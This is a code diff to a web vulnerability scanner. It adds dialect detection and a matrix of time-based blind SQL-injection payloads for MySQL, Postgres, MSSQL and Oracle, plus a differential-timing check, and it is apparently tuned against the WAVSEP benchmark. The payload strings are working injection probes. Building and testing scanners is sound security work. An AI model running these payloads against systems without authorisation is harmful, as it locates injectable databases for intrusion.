@@ -255,6 +255,58 @@ _SQL_ERRORS = [
     "quoted string not properly terminated", "sql syntax.*mysql", "mysqli_",
     "pg_query", "psql:", "sqlite3::", "odbc sql", "microsoft ole db",
 ]
+
+# ---- adaptive time-based blind SQLi: dialect x injection-context matrix -------------------
+# The single biggest WAVSEP SQLi gap was DIALECT+CONTEXT coverage: two MySQL payloads in one
+# string context can't delay a Postgres/MSSQL/Oracle backend, or a MySQL one reached through a
+# numeric / double-quote / parenthesis context. We detect the DB DIALECT from the error signature
+# (the adaptive signal) and try that dialect FIRST, then fall through to the others so an app that
+# gives no error is still covered exhaustively (additive, never fewer payloads). Each entry is a
+# {n}-parameterised delay payload proven for that backend; contexts vary the break-out.
+_SQL_DIALECT_SIG = {   # error-text substring -> dialect key
+    "mysql": "mysql", "mariadb": "mysql", "you have an error in your sql syntax": "mysql",
+    "postgresql": "postgres", "pg_query": "postgres", "pg_": "postgres",
+    "syntax error at or near": "postgres",
+    "microsoft sql server": "mssql", "odbc sql server": "mssql", "sql server": "mssql",
+    "unclosed quotation mark": "mssql", "microsoft ole db": "mssql",
+    "ora-": "oracle", "oracle": "oracle", "quoted string not properly terminated": "oracle",
+    "sqlite": "sqlite", "sqlite3::": "sqlite",
+}
+# dialect -> list of (label, payload template with {n} seconds). Multiple injection contexts
+# (string ', numeric, double ", paren) per dialect so the break-out is not assumed.
+_TIME_PAYLOADS = {
+    "mysql": [
+        ("str-and", "1' AND SLEEP({n})-- -"), ("str-or", "1' OR SLEEP({n})-- -"),
+        ("num-and", "1 AND SLEEP({n})"), ("num-or", "1 OR SLEEP({n})"),
+        ("dq-and", '1" AND SLEEP({n})-- -'), ("paren-str", "1') AND SLEEP({n})-- -"),
+        ("subq", "1' AND (SELECT SLEEP({n}))-- -"),
+    ],
+    "postgres": [
+        ("str", "1' AND (SELECT 1 FROM PG_SLEEP({n}))-- -"),
+        ("num", "1 AND (SELECT 1 FROM PG_SLEEP({n}))"),
+        ("stack", "1'; SELECT PG_SLEEP({n})-- -"),
+        ("paren", "1') AND (SELECT 1 FROM PG_SLEEP({n}))-- -"),
+    ],
+    "mssql": [
+        ("str", "1'; WAITFOR DELAY '0:0:{n}'-- -"), ("num", "1; WAITFOR DELAY '0:0:{n}'-- -"),
+        ("bare", "1' WAITFOR DELAY '0:0:{n}'-- -"), ("paren", "1'); WAITFOR DELAY '0:0:{n}'-- -"),
+    ],
+    "oracle": [
+        ("str", "1' AND {n}=DBMS_PIPE.RECEIVE_MESSAGE('a',{n})-- -"),
+        ("num", "1 AND {n}=DBMS_PIPE.RECEIVE_MESSAGE('a',{n})"),
+    ],
+    # (SQLite has no time function; its heavy-op timing is unreliable + memory-risky, so it is
+    # covered by the error-based signature only, not the differential time-based pass.)
+}
+_TIME_DIALECT_ORDER = ("mysql", "postgres", "mssql", "oracle")
+
+
+def _detect_sql_dialect(err_text: str) -> str | None:
+    low = (err_text or "").lower()
+    for sig, dia in _SQL_DIALECT_SIG.items():
+        if sig in low:
+            return dia
+    return None
 _REDIRECT_PARAMS = {"redirect", "redirect_uri", "redirect_url", "redirecturl", "url", "uri",
                     "next", "return", "returnurl", "return_url", "returnto", "return_to",
                     "dest", "destination", "continue", "goto", "go", "out", "target", "to",
@@ -325,29 +377,43 @@ def verify_sqli(url: str, param: str, method: str, cookie: str) -> tuple[bool, s
         return True, (f"boolean-based diff (true={len(t)} false={len(f)} "
                       f"base={len(base)}, delta={_delta})")
 
-    # Time-based blind: WAVSEP's "200-identical" cases give NO error and NO length signal — only a
-    # delay betrays them. Differential timing rules out a coincidentally-slow endpoint: a working
-    # injection makes SLEEP(5) take ~5s while SLEEP(0) returns immediately, and SLEEP(2) lands in
-    # between. Non-injectable params ignore the payload => no delay => not flagged. SELECT-based,
-    # non-destructive (production-safe caps this technique). Two DB dialects cover most of WAVSEP.
-    for tmpl in ("1' AND SLEEP({})-- -", "1 AND SLEEP({})"):
-        try:
-            _t0 = time.monotonic(); _req(method, url, param, tmpl.format(0), cookie)
-            fast = time.monotonic() - _t0
-            if fast > 4.0:      # naturally-slow endpoint => timing is unreliable AND expensive; skip
-                break
-            _t0 = time.monotonic(); _req(method, url, param, tmpl.format(5), cookie)
-            slow = time.monotonic() - _t0
-        except Exception:  # noqa: BLE001
-            continue
-        if slow > fast + 3.8 and slow > 3.8:
-            try:
-                _t0 = time.monotonic(); _req(method, url, param, tmpl.format(2), cookie)
-                mid = time.monotonic() - _t0
-            except Exception:  # noqa: BLE001
-                mid = 0.0
-            if fast + 1.0 < mid < slow - 1.0:   # 2s sleep sits between 0s and 5s => real time-based
-                return True, f"time-based blind SQLi (SLEEP(5)={slow:.1f}s vs {fast:.1f}s baseline)"
+    # Time-based blind (DIALECT + CONTEXT adaptive): WAVSEP's "200-identical" cases give NO error
+    # and NO length signal — only a delay betrays them, and the delay function is DB-specific. We
+    # detect the dialect from the error signature (adaptive) and try that backend's payloads FIRST,
+    # then fall through to EVERY other dialect/context so a no-error app is still covered
+    # exhaustively (additive — strictly more payloads than the old 2-MySQL pass). Differential
+    # timing (0s vs 5s, then a 2s confirmation that must land in between) rules out a naturally-slow
+    # endpoint and payload-independent latency. SELECT-based, non-destructive (production-safe caps
+    # this technique).
+    _dia = _detect_sql_dialect(err)
+    _order = ([_dia] if _dia else []) + [d for d in _TIME_DIALECT_ORDER if d != _dia]
+    try:
+        _t0 = time.monotonic(); _req(method, url, param, "1", cookie)
+        _baseline = time.monotonic() - _t0
+    except Exception:  # noqa: BLE001
+        _baseline = 0.0
+    if _baseline <= 4.0:   # a naturally-slow endpoint makes timing unreliable AND expensive
+        for _d in _order:
+            for _label, _tmpl in _TIME_PAYLOADS.get(_d, []):
+                try:
+                    _t0 = time.monotonic(); _req(method, url, param, _tmpl.format(n=0), cookie)
+                    fast = time.monotonic() - _t0
+                    if fast > 4.0:
+                        continue
+                    _t0 = time.monotonic(); _req(method, url, param, _tmpl.format(n=5), cookie)
+                    slow = time.monotonic() - _t0
+                except Exception:  # noqa: BLE001
+                    continue
+                if slow > fast + 3.8 and slow > 3.8:
+                    try:
+                        _t0 = time.monotonic(); _req(method, url, param, _tmpl.format(n=2), cookie)
+                        mid = time.monotonic() - _t0
+                    except Exception:  # noqa: BLE001
+                        mid = 0.0
+                    if fast + 1.0 < mid < slow - 1.0:   # 2s sits between 0s and 5s => real
+                        _tag = f"{_d} detected" if _d == _dia else _d
+                        return True, (f"time-based blind SQLi [{_tag}/{_label}]: "
+                                      f"5s={slow:.1f}s vs 0s={fast:.1f}s")
     return False, "no SQL error, boolean, or timing signal"
 
 
